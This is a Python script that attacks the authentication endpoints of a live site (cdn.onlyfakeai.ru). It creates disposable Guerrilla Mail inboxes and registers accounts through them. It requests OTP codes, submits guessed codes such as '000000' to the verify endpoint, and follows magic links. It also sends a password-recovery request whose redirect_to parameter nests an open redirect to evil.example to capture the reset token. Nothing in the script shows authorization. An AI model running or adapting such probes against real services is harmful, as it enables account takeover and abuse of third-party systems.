import ssl, json, urllib.request, urllib.error, urllib.parse, sys, time, random, re
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
ctx = ssl.create_default_context()
KEY = "<publishable-key>"
SUPA = "https://cdn.onlyfakeai.ru"
GM = "https://api.guerrillamail.com/ajax.php"
UA = {"User-Agent": "Mozilla/5.0", "Accept": "application/json", "Content-Type": "application/json"}

def req(method, url, body=None, token=None, extra=None, follow=True):
    h = dict(UA)
    if token: h["Authorization"] = f"Bearer {token}"
    if extra: h.update(extra)
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(url, data=data, headers=h, method=method)
    class NoRedir(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, *a, **k): return None
    opener = urllib.request.build_opener(urllib.request.HTTPRedirectHandler() if follow else NoRedir)
    try:
        with opener.open(r, timeout=30) as resp:
            return resp.status, dict(resp.headers), resp.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read().decode("utf-8", "ignore")
    except Exception as e:
        return 0, {}, repr(e)

def new_inbox():
    st, hd, b = req("GET", GM + "?f=get_email_address&lang=en&site=guerrillamail.com")
    d = json.loads(b)
    return d["email_addr"].split("@")[0] + "@sharklasers.com", d["sid_token"]

def list_mail(sid):
    st, hd, b = req("GET", GM + f"?f=get_email_list&offset=0&sid_token={sid}")
    try: return json.loads(b).get("list", [])
    except Exception: return []

def fetch_mail(sid, mid):
    st, hd, b = req("GET", GM + f"?f=fetch_email&email_id={mid}&sid_token={sid}")
    try: return json.loads(b)
    except Exception: return {}

def wait_for(sid, want="onlyfake", limit=25):
    for i in range(limit):
        time.sleep(4)
        for m in list_mail(sid):
            if want in (m.get("mail_from") or "").lower():
                return m
    return None

def body_of(msg):
    parts = []
    for k in ("mail_body", "mail_body_text", "mail_body_html"):
        v = msg.get(k)
        if isinstance(v, str): parts.append(v)
    return "\n".join(parts)

# ---------- A) OTP / magic-link code for a REGISTERED email ----------
addr, sid = new_inbox()
print("inbox:", addr)
pw = "Zq7#vL2!mX9$wR4"
st, hd, b = req("POST", SUPA + "/auth/v1/signup", {"email": addr, "password": pw}, extra={"apikey": KEY})
print("signup:", st, b[:90])
st, hd, b = req("POST", SUPA + "/auth/v1/otp", {"email": addr, "create_user": False}, extra={"apikey": KEY})
print("otp request:", st, b[:150])
m = wait_for(sid)
print("otp mail:", json.dumps(m)[:300] if m else "NONE")
code = None
if m:
    msg = fetch_mail(sid, m["mail_id"])
    body = body_of(msg)
    print("OTP MAIL BODY:", re.sub(r"\s+", " ", body)[:1200])
    codes = re.findall(r"\b(\d{6,8})\b", re.sub(r"<[^>]+>", " ", body))
    print("candidate codes:", codes)
    if codes: code = codes[0]
    links = re.findall(r"https?://[^\s\"'<>\)]+", body)
    print("links:", links[:3])
    if code:
        for attempt in (code, "000000", "111111"):
            st, hd, b = req("POST", SUPA + "/auth/v1/verify", {"type": "email", "email": addr, "token": attempt}, extra={"apikey": KEY})
            print(f"verify code={attempt}:", st, b[:200])
            time.sleep(2)
    else:
        for u in links:
            if "verify" in u or "token=" in u:
                u = u.replace("&amp;", "&")
                st, hd, b = req("GET", u, extra={"apikey": KEY}, follow=False)
                print("CLICK magiclink:", st, (hd.get("Location") or "")[:400])
                break

# ---------- B) recover with redirect_to as QUERY parameter ----------
addr2, sid2 = new_inbox()
print("\ninbox2:", addr2)
pw2 = "Zq7#vL2!mX9$wR4"
st, hd, b = req("POST", SUPA + "/auth/v1/signup", {"email": addr2, "password": pw2}, extra={"apikey": KEY})
print("signup2:", st, b[:80])
deepq = urllib.parse.quote("https://onlyfakeai.ru/login?redirect=https%3A%2F%2Fevil.example%2Fpwn", safe="")
st, hd, b = req("POST", SUPA + "/auth/v1/recover?redirect_to=" + deepq, {"email": addr2}, extra={"apikey": KEY})
print("recover query redirect_to:", st, b[:120])
m2 = wait_for(sid2)
if m2:
    msg2 = fetch_mail(sid2, m2["mail_id"])
    body2 = body_of(msg2)
    print("RECOVER2 BODY:", re.sub(r"\s+", " ", body2)[:900])
    for u in re.findall(r"https?://[^\s\"'<>\)]+", body2):
        print("  link:", u[:420])
